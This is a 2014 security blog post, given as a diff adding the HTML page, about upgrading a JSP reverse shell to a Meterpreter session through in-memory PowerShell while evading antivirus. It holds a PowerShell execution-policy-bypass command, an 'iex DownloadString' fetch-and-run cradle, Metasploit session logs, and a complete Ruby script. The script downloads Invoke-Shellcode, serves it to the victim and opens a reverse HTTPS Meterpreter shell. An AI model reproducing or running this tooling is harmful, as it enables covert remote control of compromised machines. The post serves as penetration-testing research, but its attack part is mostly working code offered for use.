@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>meterpreter shell upgrades using powershell</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>meterpreter shell upgrades using powershell</h1>
+			<b><time>2014-03-10</time></b>
+		       
+
+			<div>
+				<p>One of my primary goals during development of <a href="https://github.com/hatRiot/clusterd">clusterd</a> was ensuring reliability and covertness during remote deploys.  It&rsquo;s no secret that antivirus routinely eats vanilla meterpreter shells.  For this, the <code>--gen-payload</code> flag generates a war file with <code>java/jsp_shell_reverse_tcp</code> tucked inside.  This is used due to it being largely undetected by AV, and our environments are perfectly suited for it.  However, Meterpreter is a fantastic piece of software, and it&rsquo;d be nice to be able to elevate from this simple JSP shell into it.</p>
+<p>Metasploit has a solution for this, sort of.  <code>sessions -u</code> can be used to upgrade an existing shell session into a full-blown Meterpreter.  Unfortunately, the current implementation uses <code>Rex::Exploitation::CmdStagerVBS</code>, which writes the executable to disk and executes it.  This is almost always immediately popped by most enterprise-grade (and even most consumer grade) AV&rsquo;s.  For this, we need a new solution.</p>
+<p>The easiest solution is Powershell; this allows us to execute shellcode completely in-memory, without ever bouncing files against disk.  I used Obscure Security&rsquo;s canonical <a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html">post</a> on it for my implementation.  The only problem really is portability, as Powershell doesn&rsquo;t exist on Windows XP.  This could be mitigated by patching in shellcode via Java, but that&rsquo;s another post for another time.</p>
+<p>Right, so how&rsquo;s this work?  We essentially execute a Powershell command in the running session (our generic shell) that fetches a payload from a remote server and executes it.  Our payload in this case is <a href="https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1">Invoke-Shellcode</a>, from the PowerSploit package.  This bit of code will generate our reverse HTTPS meterpreter shell and inject it into the current process ID.  Our command looks like this:</p>
+<pre tabindex="0"><code>cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc %s&#34;
+</code></pre><p>Our encoded payload is:</p>
+<pre tabindex="0"><code>iex (New-Object Net.WebClient).DownloadString(&#39;http://%s:%s/&#39;)
+</code></pre><p>IEX, or Invoke-Expression, is just an eval operation.  In this case, we&rsquo;re fetching a URL and executing it.  This is a totally transparent, completely in-memory solution.  Let&rsquo;s have a look at it running:</p>
+<pre tabindex="0"><code>msf exploit(handler) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Type         Information                                                                       Connection
+  --  ----         -----------                                                                       ----------
+  1   shell linux  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  192.168.1.6:4444 -&gt; 192.168.1.102:60911 (192.168.1.102)
+
+msf exploit(handler) &gt; 
+</code></pre><p>We see above that we currently have a generic shell (it&rsquo;s the java/jsp_shell_reverse_tcp payload) on a Windows 7 system (which happens to be running MSE).  Using this new script, we can upgrade this session to Meterpreter:</p>
+<pre tabindex="0"><code>msf exploit(handler) &gt; sessions -u 1
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:53568/
+[*] Starting the payload handler...
+[*] 192.168.1.102:60922 Request received for /INITM...
+[*] 192.168.1.102:60922 Staging connection for target /INITM received...
+[*] Patched user-agent at offset 663128...
+[*] Patched transport at offset 662792...
+[*] Patched URL at offset 662856...
+[*] Patched Expiration Timeout at offset 663728...
+[*] Patched Communication Timeout at offset 663732...
+[*] Meterpreter session 2 opened (192.168.1.6:53568 -&gt; 192.168.1.102:60922) at 2014-03-11 23:09:36 -0600
+msf exploit(handler) &gt; sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter &gt; sysinfo
+Computer        : BRYAN-PC
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x64 (Current Process is WOW64)
+System Language : en_US
+Meterpreter     : x86/win32
+meterpreter &gt; 
+</code></pre><p>And just like that, without a peep from MSE, we&rsquo;ve got a Meterpreter shell.</p>
+<p>You can find the code for this implementation below, though be warned; this is PoC quality code, and probably even worse as I&rsquo;m not really a Ruby developer.  Meatballs over at Metasploit has a few awesome Powershell pull requests waiting for a merge.  Once this is done, I can implement that here and submit a proper implementation.  If you&rsquo;d like to try this out, simply create a backup copy of <code>scripts/shell/spawn_meterpreter.rb</code> and copy in the following, then <code>reload</code>.  You should be upgradin&rsquo; and bypassin&rsquo; in no time.</p>
+<pre tabindex="0"><code>#
+# Session upgrade using Powershell IEX
+# 
+# Some code stolen from jduck&#39;s original implementation
+#
+# -drone
+#
+
+class HTTPServer
+    #
+    # Using Ruby HTTPServer here since this isn&#39;t a module, and I can&#39;t figure
+    # out how to use MSF libs in here
+    #
+    @sent = false
+    def state
+        return @sent
+    end
+
+    def initialize(port, body)
+        require &#39;socket&#39;
+
+        @sent = false
+        @server = Thread.new do
+            server = TCPServer.open port
+            loop do
+                client = server.accept
+                content_type = &#34;text/plain&#34;
+                client.puts &#34;HTTP/1.0 200 OK\r\nContent-type: #{content_type}&#34;\
+                            &#34;\r\nContent-Length: #{body.length}\r\n\r\n#{body}&#34;\
+                            &#34;\r\n\r\n&#34;
+                sleep 5
+                client.close
+                kill
+            end
+        end
+     end
+
+     def kill!
+        @sent = true
+        @server.kill
+     end
+
+     alias :kill :kill!
+end
+
+#
+# Returns if a port is used by a session
+#
+def is_port_used?(port)
+    framework.sessions.each do |sid, obj|
+       local_info = obj.instance_variable_get(:@local_info)
+       return true if local_info =~ /:#{port}$/
+    end
+
+    false
+end
+
+def start_http_service(port)
+    @server = HTTPServer.new(port, @pl)
+end
+
+def wait_payload
+
+    waited = 0
+    while (not @server.state)
+        select(nil, nil, nil, 1)
+        waited += 1
+        if (waited &gt; 10) # MAGIC NUMBA
+            @server.kill
+            raise RuntimeError, &#34;No payload requested&#34;
+        end
+    end
+end
+
+def generate(host, port, sport)
+    require &#39;net/http&#39;
+
+    script_block = &#34;iex (New-Object Net.WebClient).DownloadString(&#39;http://%s:%s/&#39;)&#34; % [host, sport]
+    cmd = &#34;cmd.exe /c PowerShell.exe -Exec ByPass -Nol %s&#34; % script_block
+
+    # generate powershell payload
+    url = URI.parse(&#39;https://raw.github.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&#39;)
+    req = Net::HTTP::Get.new(url.path)
+    http = Net::HTTP.new(url.host, url.port)
+    http.use_ssl = true
+
+    res = http.request(req)
+
+    if !res or res.code != &#39;200&#39;
+      raise RuntimeError, &#34;Could not retrieve Invoke-Shellcode&#34;
+    end
+
+    @pl = res.body
+    @pl &lt;&lt; &#34;\nInvoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force&#34; % [host, port]
+    return cmd
+end
+
+
+#
+# Mimics what MSF already does if the user doesn&#39;t manually select a payload and lhost
+#
+lhost = framework.datastore[&#39;LHOST&#39;]
+unless lhost
+  lhost = Rex::Socket.source_address
+end
+
+#
+# If there is no LPORT defined in framework, then pick a random one that&#39;s not used
+# by current sessions. This is possible if the user assumes module datastore options
+# are the same as framework datastore options.
+#
+lport = framework.datastore[&#39;LPORT&#39;]
+unless lport
+  lport = 4444 # Default meterpreter port
+  while is_port_used?(lport)
+    # Pick a port that&#39;s not used
+    lport = [*49152..65535].sample
+  end
+end
+
+# do the same from above, but for the server port
+sport = [*49152..65535].sample
+while is_port_used?(sport)
+    sport = [*49152..65535].sample
+end
+
+# maybe we want our sessions going to another instance?
+use_handler = true
+use_handler = nil if (session.exploit_datastore[&#39;DisablePayloadHandler&#39;] == true)
+
+#
+# Spawn the handler if needed
+#
+aborted = false
+begin
+
+  mh = nil
+  payload_name = &#39;windows/meterpreter/reverse_https&#39;
+  if (use_handler)
+      mh = framework.modules.create(&#34;exploit/multi/handler&#34;)
+      mh.datastore[&#39;LPORT&#39;] = lport
+      mh.datastore[&#39;LHOST&#39;] = lhost
+      mh.datastore[&#39;PAYLOAD&#39;] = payload_name
+      mh.datastore[&#39;ExitOnSession&#39;] = false
+      mh.datastore[&#39;EXITFUNC&#39;] = &#39;process&#39;
+      mh.exploit_simple(
+        &#39;LocalInput&#39;     =&gt; session.user_input,
+        &#39;LocalOutput&#39;    =&gt; session.user_output,
+        &#39;Payload&#39;        =&gt; payload_name,
+        &#39;RunAsJob&#39;       =&gt; true)
+      # It takes a little time for the resources to get set up, so sleep for
+      # a bit to make sure the exploit is fully working.  Without this,
+      # mod.get_resource doesn&#39;t exist when we need it.
+      select(nil, nil, nil, 0.5)
+      if framework.jobs[mh.job_id.to_s].nil?
+        raise RuntimeError, &#34;Failed to start multi/handler - is it already running?&#34;
+      end
+    end
+
+    # Generate our command and payload
+    cmd = generate(lhost, lport, sport)
+
+    # start http service
+    start_http_service(sport)
+
+    sleep 2 # give it a sec to startup
+
+    # execute command
+    session.run_cmd(cmd)
+
+    if not @server.state
+        # wait...
+        wait_payload
+    end
+
+rescue ::Interrupt
+  # TODO: cleanup partial uploads!
+  aborted = true
+rescue =&gt; e
+  print_error(&#34;Error: #{e}&#34;)
+  aborted = true
+end
+
+#
+# Stop the job
+#
+if (use_handler)
+  Thread.new do
+    if not aborted
+      # Wait up to 10 seconds for the session to come in..
+      select(nil, nil, nil, 10)
+    end
+    framework.jobs.stop_job(mh.job_id)
+  end
+end
+</code></pre><!-- raw HTML omitted -->
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
